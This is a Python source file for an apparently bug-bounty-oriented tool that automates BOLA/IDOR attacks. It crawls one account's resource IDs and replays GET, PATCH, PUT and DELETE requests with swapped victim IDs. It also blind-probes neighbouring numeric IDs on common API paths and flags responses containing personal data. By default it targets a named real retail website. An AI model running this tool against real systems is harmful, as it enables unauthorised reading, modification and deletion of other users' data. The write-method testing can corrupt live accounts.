"""
Aura v2 — Cross-Tenant BOLA/IDOR Engine
=========================================
This is the real BOLA (Broken Object Level Authorization) hunter.

Unlike the old idor_hunter.py which guesses IDs blindly,
this engine does:

  1. ATTACKER session → crawl own resources → collect real UUIDs/IDs
  2. VICTIM session → attempt to GET/PATCH/DELETE those same resource IDs
  3. Compare responses → confirm unauthorized access

This is exactly the attack that earns $500–$5,000 on bug bounty platforms.

Usage:
    python -m aura.modules.idor_engine_v2 --target www.iciparisxl.nl
    or
    aura www.iciparisxl.nl --hunt
"""

import asyncio
import json
import os
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional
import typing

import requests
from requests.exceptions import ConnectionError, Timeout

# Suppress SSL warnings (we're using Burp proxy sometimes)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ─── Constants ─────────────────────────────────────────────────────────────────
UUID_RE = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.IGNORECASE)
NUMERIC_ID_RE = re.compile(r'/(\d{3,})')

# HTTP methods to test (GET is for reading, PATCH/DELETE are critical)
READ_METHODS = ["GET"]
WRITE_METHODS = ["PATCH", "PUT", "DELETE"]

# Minimum response body length to consider "meaningful"
MIN_MEANINGFUL_LEN = 50

# Common API path prefixes to probe blindly when no discovery map
BLIND_PROBE_PATHS = [
    "/api/v1/user/{id}", "/api/v2/user/{id}", "/api/users/{id}",
    "/api/v1/orders/{id}", "/api/v2/orders/{id}",
    "/api/v1/addresses/{id}", "/api/customers/{id}",
    "/api/v1/profile/{id}", "/api/v1/tickets/{id}",
    "/api/v1/invoices/{id}", "/api/payments/{id}",
    "/api/v1/subscriptions/{id}",
]


class BolaTester:
    """
    Cross-Tenant BOLA/IDOR Tester.
    
    Requires two session cookie strings:
      - attacker_cookies: Your account (you know its data)
      - victim_cookies: Second account (should NOT be able to see attacker's data)
    """

    def __init__(
        self,
        target: str,
        attacker_cookies: str,
        victim_cookies: str = "",
        proxy: Optional[str] = None,
        timeout: int = 20,
    ):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.timeout = timeout
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.single_account_mode = not bool(victim_cookies)

        # Build session headers (cookie strings → cookie dict)
        self.attacker_cookies = self._parse_cookie_string(attacker_cookies)
        self.victim_cookies = self._parse_cookie_string(victim_cookies) if victim_cookies else {}

        # Results
        self.confirmed_idors: list[dict] = []
        self.tested_count = 0
        self.candidate_idor_pairs: list[dict] = []

    @staticmethod
    def _parse_cookie_string(cookie_str: str) -> dict:
        """Converts a raw Cookie header string into a dict."""
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, value = part.partition("=")
                cookies[name.strip()] = value.strip()
        return cookies

    def _extract_context(self) -> dict:
        """
        [Auth Matrix Core]
        Extracts known IDs (UUIDs, user IDs, emails) belonging to the Attacker
        and the Victim to enable strategic parameter swapping.
        """
        context = {
            "attacker": {"ids": [], "emails": []},
            "victim": {"ids": [], "emails": []}
        }
        
        # Helper to extract from common profile endpoints
        def _fetch_profile(cookies, role):
            for path in ["/api/v1/me", "/api/me", "/api/v1/profile", "/api/user", "/profile"]:
                resp = self._request("GET", self.target + path, cookies)
                if resp["status"] == 200 and resp["body"]:
                    try:
                        data = json.loads(resp["body"])
                        # Extract IDs
                        for key in ["id", "user_id", "userId", "uid", "customerId", "uuid", "account_id"]:
                            val = data.get(key)
                            if val and str(val) not in context[role]["ids"]:
                                context[role]["ids"].append(str(val))
                                print(f"  [Matrix] Extracted {role} ID: {val}")
                        # Extract Emails
                        for key in ["email", "emailAddress", "username"]:
                            val = data.get(key)
                            if val and str(val) not in context[role]["emails"]:
                                context[role]["emails"].append(str(val))
                    except Exception:
                        pass

        print("\n[🎯] Initializing Auth Matrix Context...")
        _fetch_profile(self.attacker_cookies, "attacker")
        if not self.single_account_mode:
            _fetch_profile(self.victim_cookies, "victim")
            
        return context

    def _swap_payload(self, original_data: str, attacker_ids: list, victim_ids: list) -> str:
        """
        Replaces attacker's known IDs/emails in the payload with the victim's
        to attempt unauthorized cross-tenant data modification.
        """
        if not original_data or not attacker_ids or not victim_ids:
            return original_data
            
        swapped = original_data
        # Replace first attacker ID with first victim ID (most common BOLA case)
        # e.g. {"user_id": 901} -> {"user_id": 902}
        if len(attacker_ids) > 0 and len(victim_ids) > 0:
             swapped = swapped.replace(str(attacker_ids[0]), str(victim_ids[0]))
             
        # Can scale this to swap emails or UUIDs later
        return swapped

    def _request(
        self,
        method: str,
        url: str,
        cookies: dict,
        body: Optional[str] = None,
        extra_headers: Optional[dict] = None,
    ) -> dict[str, typing.Any]:
        """Makes a single HTTP request and returns a structured result."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "nl-NL,nl;q=0.9,en;q=0.8",
            "X-Intigriti-Username": os.getenv("INTIGRITI_USERNAME", "mutasem_mk4"),
        }
        if extra_headers:
            headers.update(extra_headers)
        if body:
            headers["Content-Type"] = "application/json"

        try:
            resp = requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=cookies,
                data=body,
                timeout=self.timeout,
                verify=False,
                proxies=self.proxy,
                allow_redirects=False,
            )
            text = resp.text or ""
            return {
                "status": resp.status_code,
                "length": len(text),
                "body": text[:1000],
                "headers": dict(resp.headers),
                "error": None,
            }
        except (ConnectionError, Timeout) as e:
            return {"status": 0, "length": 0, "body": "", "headers": {}, "error": str(e)[:100]}
        except Exception as e:
            return {"status": 0, "length": 0, "body": "", "headers": {}, "error": str(e)[:100]}

    def _single_account_probe(self, url: str) -> list[dict]:
        """
        Single-account IDOR mode: probes neighboring numeric IDs around the
        attacker's own ID to find predictable/accessible resources without a
        second account. Flags any 200 OK response as 'needs manual review'.
        """
        findings = []
        # Extract numeric IDs from URL
        num_ids = re.findall(r'/(\d{3,})(?:/|$|\?)', url)
        if not num_ids:
            return []

        base_id = int(num_ids[-1])
        for delta in [-2, -1, 1, 2, 5]:
            test_id = base_id + delta
            test_url = url.replace(f"/{num_ids[-1]}", f"/{test_id}")
            self.tested_count += 1
            resp = self._request("GET", test_url, self.attacker_cookies)
            if resp["status"] == 200 and resp["length"] >= MIN_MEANINGFUL_LEN:
                body_lower = resp["body"].lower()
                pii_kw = [kw for kw in ["email", "name", "address", "phone", "order", "payment"]
                          if kw in body_lower]
                if pii_kw:
                    findings.append({
                        "url": test_url,
                        "method": "GET",
                        "type": "BOLA / IDOR",
                        "reason": f"Single-account probe: neighboring ID {test_id} returned 200 with PII ({', '.join(pii_kw)}). Manual verification required with a second account.",
                        "attacker_status": resp["status"],
                        "attacker_len": resp["length"],
                        "victim_status": 0,
                        "victim_len": 0,
                        "victim_body_snippet": resp["body"][:300],
                        "severity": "MEDIUM",
                        "cvss_score": 5.3,
                        "owasp": "A01:2021 — Broken Access Control",
                        "timestamp": datetime.utcnow().isoformat(),
                        "needs_manual_verify": True,
                    })
                    print(f"     ⚠️  Neighboring ID {test_id} returned 200 with PII: {', '.join(pii_kw)}")
        return findings

    def _compare_responses(self, attacker_resp: dict, victim_resp: dict) -> tuple[bool, str]:
        """
        Determine if the victim's response indicates unauthorized access to attacker's resource.
        
        BOLA confirmed if:
        - Victim gets 200 OK with meaningful data (not empty, not error JSON)
        - Response body contains data (PII indicators, user references, etc.)
        """
        v_status = victim_resp["status"]
        v_len = victim_resp["length"]
        v_body = victim_resp["body"].lower()

        # If victim gets blocked → not vulnerable
        if v_status in (401, 403, 404):
            return False, f"Victim got {v_status} — Access properly denied ✅"

        if v_status == 0:
            return False, f"Connection error: {victim_resp['error']}"

        # If victim gets 200 with meaningful content
        if v_status == 200 and v_len >= MIN_MEANINGFUL_LEN:
            # Check for PII indicators in the response body
            pii_keywords = ["email", "name", "address", "phone", "dob", "credit", 
                           "cart", "order", "entries", "customer", "user", "account"]
            pii_found = [kw for kw in pii_keywords if kw in v_body]
            
            if pii_found:
                return True, (
                    f"✅ BOLA CONFIRMED! Victim accessed attacker's resource (HTTP {v_status}). "
                    f"PII indicators found: {', '.join(pii_found[:3])}. "
                    f"Response length: {v_len} bytes."
                )
            elif v_len > 200:
                return True, (
                    f"✅ POSSIBLE BOLA! Victim accessed resource with {v_len} bytes of data (HTTP {v_status}). "
                    f"Manual review required."
                )
        
        # If victim gets 2xx but with minimal data (might be silent drop like ICI cart)
        if v_status in (200, 201, 204) and v_len < MIN_MEANINGFUL_LEN:
            return False, f"Victim got {v_status} but minimal body ({v_len} bytes) — likely silent drop"

        return False, f"No clear BOLA signal (victim status: {v_status}, length: {v_len})"

    def test_endpoint(self, endpoint: dict, context: dict = None) -> Optional[dict]:
        """
        Tests a single endpoint for BOLA by:
        1. Making the request as ATTACKER → baseline
        2. Replaying as VICTIM → check unauthorized access
        [Auth Matrix Edition] - Swaps attacker's payload IDs with victim's IDs during replay.
        """
        url = endpoint["url"]
        method = endpoint.get("method", "GET")
        post_data = endpoint.get("post_data")

        print(f"\n  🎯 Testing [{method}] {url[:90]}")

        # Step 1: Attacker request (baseline — should succeed with their own data)
        attacker_resp = self._request(method, url, self.attacker_cookies, body=post_data)
        print(f"     👤 Attacker: HTTP {attacker_resp['status']} ({attacker_resp['length']} bytes)")

        if attacker_resp["status"] not in (200, 201, 204):
            print(f"     ⚠️  Skipping — Attacker didn't get 2xx (got {attacker_resp['status']})")
            return None

        # [Auth Matrix] Prepare malicious request (Swapping logic)
        malicious_url = url
        malicious_body = post_data
        
        if context and not self.single_account_mode:
            # Swap in the URL (e.g. /api/users/901 -> /api/users/902)
            if context["attacker"]["ids"] and context["victim"]["ids"]:
                a_id = context["attacker"]["ids"][0]
                v_id = context["victim"]["ids"][0]
                malicious_url = malicious_url.replace(a_id, v_id)
                
            # Swap in the body (e.g. {"user_id": 901} -> {"user_id": 902})
            if post_data:
                malicious_body = self._swap_payload(
                    post_data, 
                    context["attacker"]["ids"], 
                    context["victim"]["ids"]
                )
                if malicious_body != post_data:
                    print(f"     [Matrix] Injected Victim ID/Data into payload.")

        # Step 2: Victim request (Attempting to touch Attacker's resource or Attacker touching Victim's)
        # Note: The classic IDOR is Attacker reaching Victim's data. 
        # Here we use Attacker's token, but request Victim's ID (malicious_url/body).
        # We need to test if Attacker (using their own cookie) can access Victim's data.
        self.tested_count += 1
        
        # Send using ATTACKER cookies, but aiming at VICTIM'S ID
        # (This is horizontal privilege escalation / BOLA)
        victim_data_resp = self._request(method, malicious_url, self.attacker_cookies, body=malicious_body)
        print(f"     🦹 Attacker (targeting Victim ID): HTTP {victim_data_resp['status']} ({victim_data_resp['length']} bytes)")

        # Step 3: Compare Attacker's success vs Attacker attempting to hit Victim's scope
        # If the attacker successfully modified or retrieved the victim's data, we have a critical finding.
        is_bola, reason = self._compare_responses(attacker_resp, victim_data_resp)

        if is_bola:
            print(f"     🚨 {reason}")
            finding = {
                "url": malicious_url,
                "method": method,
                "reason": f"Auth Matrix Injection: {reason}",
                "attacker_status": attacker_resp["status"],
                "attacker_len": attacker_resp["length"],
                "victim_status": victim_data_resp["status"],
                "victim_len": victim_data_resp["length"],
                "victim_body_snippet": victim_data_resp["body"][:300],
                "ids_in_url": endpoint.get("ids", []),
                "source_page": endpoint.get("source_page", ""),
                "timestamp": datetime.utcnow().isoformat(),
                "severity": "CRITICAL" if method in ["POST", "PUT", "PATCH", "DELETE"] else "HIGH",
                "cvss_score": 9.1 if method in ["POST", "PUT", "PATCH", "DELETE"] else 8.1,
                "owasp": "A01:2021 — Broken Access Control (BOLA)",
                "type": "BOLA / IDOR",
            }
            self.confirmed_idors.append(finding)
            return finding
        else:
            print(f"     ✅ Secure (Denied or Not Applicable)")
            return None

    def run_from_discovery_map(self, map_path: str) -> list[dict]:
        """
        Main entry point: loads a Discovery Map from the Crawler
        and runs BOLA tests on all IDOR candidates.
        """
        map_file = Path(map_path)
        if not map_file.exists():
            print(f"❌ Discovery map not found: {map_path}")
            print("   Run: aura <target> --crawl  first!")
            return []

        with open(map_file, "r", encoding="utf-8-sig") as f:
            discovery_map = json.load(f)

        meta = discovery_map.get("meta", {})
        idor_candidates = discovery_map.get("idor_candidates", [])
        mutating_eps = discovery_map.get("mutating_endpoints", [])

        print(f"\n{'='*65}")
        print(f"🔥 AURA v2 — BOLA/IDOR Cross-Tenant Engine")
        print(f"🎯 Target: {meta.get('target', 'unknown')}")
        print(f"📋 IDOR Candidates: {len(idor_candidates)}")
        print(f"⚡ Mutating Endpoints: {len(mutating_eps)}")
        print(f"{'='*65}")

        # Test IDOR candidates (GET requests on ID-bearing URLs)
        all_endpoints = []
        for ep in idor_candidates:
            all_endpoints.append({
                "url": ep["url"],
                "method": "GET",
                "ids": ep.get("ids", []),
                "source_page": ep.get("source_page", ""),
            })
        
        # Also test mutating endpoints (POST/PATCH/DELETE)
        for ep in mutating_eps:
            all_endpoints.append({
                "url": ep["url"],
                "method": ep["method"],
                "post_data": ep.get("post_data"),
                "ids": [],
                "source_page": ep.get("source_page", ""),
            })

        if not all_endpoints:
            if self.single_account_mode:
                # No discovery map and no victim — try blind probe on common paths
                print("\n🔍 No IDOR candidates in map. Switching to Single-Account Blind Probe mode...")
                print("   (For full cross-tenant BOLA testing, add AUTH_TOKEN_VICTIM to .env)")
                return self._run_blind_probe()
            else:
                print("\n⚠️  No endpoints to test!")
                print("   The discovery map is empty. Did the crawl authenticate successfully?")
                print("   Check that AUTH_TOKEN_ATTACKER in .env has a fresh session cookie.")
                return []

        print(f"\n🚀 Starting {len(all_endpoints)} BOLA tests...") 
        if self.single_account_mode:
            print("   ⚠️  Single-account mode (no victim token) — results need manual verification")
            
        context = self._extract_context()

        for ep in all_endpoints:
            if self.single_account_mode:
                # Only probe neighbors; skip cross-tenant compare
                url = ep.get("url", "")
                nums = re.findall(r'/(\d{3,})(?:/|$|\?)', url)
                if nums:
                    self.confirmed_idors.extend(self._single_account_probe(url))
            else:
                self.test_endpoint(ep, context)

        return self._finalize_report(meta)

    def _run_blind_probe(self) -> list[dict]:
        """Probes common API paths with incrementing IDs — no discovery map required."""
        # First, get our own user ID from common profile endpoints
        own_id = None
        for path in ["/api/v1/me", "/api/me", "/api/v1/profile", "/api/user"]:
            resp = self._request("GET", self.target + path, self.attacker_cookies)
            if resp["status"] == 200 and resp["body"]:
                try:
                    data = json.loads(resp["body"])
                    own_id = (data.get("id") or data.get("user_id") or 
                              data.get("userId") or data.get("uid") or
                              data.get("customerId"))
                    if own_id:
                        own_id = int(str(own_id))
                        print(f"  ✅ Found own user ID: {own_id}")
                        break
                except Exception:
                    continue

        probe_findings = []
        for path_template in BLIND_PROBE_PATHS:
            base_id = int(own_id) if own_id is not None else 1000
            for delta in [-2, -1, 1, 2]:
                test_id = base_id + delta
                url = self.target + path_template.replace("{id}", str(test_id))
                self.tested_count += 1
                resp = self._request("GET", url, self.attacker_cookies)
                if resp["status"] == 200 and resp["length"] >= MIN_MEANINGFUL_LEN:
                    pii_kw = [kw for kw in ["email", "name", "address", "phone", "order"]
                              if kw in resp["body"].lower()]
                    if pii_kw:
                        f = {
                            "url": url, "method": "GET", "type": "BOLA / IDOR",
                            "reason": f"Blind probe: {path_template} with ID {test_id} returned 200 with PII ({', '.join(pii_kw)})",
                            "attacker_status": resp["status"], "attacker_len": resp["length"],
                            "victim_status": 0, "victim_len": 0,
                            "victim_body_snippet": resp["body"][:300],
                            "severity": "MEDIUM", "cvss_score": 5.3,
                            "owasp": "A01:2021 — Broken Access Control",
                            "timestamp": datetime.utcnow().isoformat(),
                            "needs_manual_verify": True,
                        }
                        probe_findings.append(f)
                        self.confirmed_idors.append(f)
                        print(f"  ⚠️  Potential IDOR: {url} (PII: {', '.join(pii_kw)})")

        self._finalize_report({})
        return probe_findings

    def _finalize_report(self, meta: dict) -> list[dict]:
        """Prints the final summary and saves findings."""
        print(f"\n{'='*65}")
        print(f"✅ HUNT COMPLETE")
        print(f"{'='*65}")
        print(f"  🔍 Endpoints Tested : {self.tested_count}")
        print(f"  🚨 BOLA Confirmed   : {len(self.confirmed_idors)}")
        
        if self.confirmed_idors:
            print(f"\n{'🔴'*30}")
            print(f"  💰 CONFIRMED BOLA/IDOR FINDINGS:")
            for i, finding in enumerate(self.confirmed_idors, 1):
                print(f"\n  [{i}] [{finding['method']}] {finding['url'][:80]}")
                print(f"      Severity: {finding['severity']} | CVSS: {finding['cvss_score']}")
                print(f"      {finding['reason']}")
            print(f"{'🔴'*30}\n")
            
            # Save findings report
            self._save_report()
        else:
            print(f"\n  ✅ No unauthorized access detected on tested endpoints.")
            print(f"  💡 Tip: Update your session cookies and re-run --crawl for fresh endpoints.\n")

        return self.confirmed_idors

    def _save_report(self):
        """Saves confirmed BOLA findings to a JSON report."""
        reports_dir = Path("./reports")
        reports_dir.mkdir(exist_ok=True)
        
        target_slug = self.target_domain.replace(".", "_").replace("www_", "")
        output_path = reports_dir / f"bola_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.target,
                "scan_time": datetime.utcnow().isoformat(),
                "total_confirmed": len(self.confirmed_idors),
                "findings": self.confirmed_idors
            }, f, indent=2)
        
        print(f"  💾 Findings saved: {output_path}")


def run_hunt(target: str, discovery_map_path: Optional[str] = None):
    """
    Synchronous runner for the BOLA engine.
    Called by the CLI with `aura <target> --hunt`
    """
    from dotenv import load_dotenv
    load_dotenv()

    attacker_cookies = os.getenv("AUTH_TOKEN_ATTACKER", "")
    victim_cookies = os.getenv("AUTH_TOKEN_VICTIM", "")

    if not attacker_cookies:
        print("❌ AUTH_TOKEN_ATTACKER not found in .env!")
        return []

    if not victim_cookies:
        print("⚠️  AUTH_TOKEN_VICTIM not set — running in Single-Account Probe mode.")
        print("   For full cross-tenant BOLA testing, add AUTH_TOKEN_VICTIM to .env")
        print("   (Create a second account on the target and paste its cookie)")

    # Auto-find discovery map if not specified
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)
        elif not victim_cookies:
            print(f"\n  No discovery map either — running Blind Probe on {target}...")

    tester = BolaTester(
        target=target,
        attacker_cookies=attacker_cookies,
        victim_cookies=victim_cookies,
    )

    if discovery_map_path:
        return tester.run_from_discovery_map(discovery_map_path)
    else:
        return tester._run_blind_probe()


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_hunt(target)
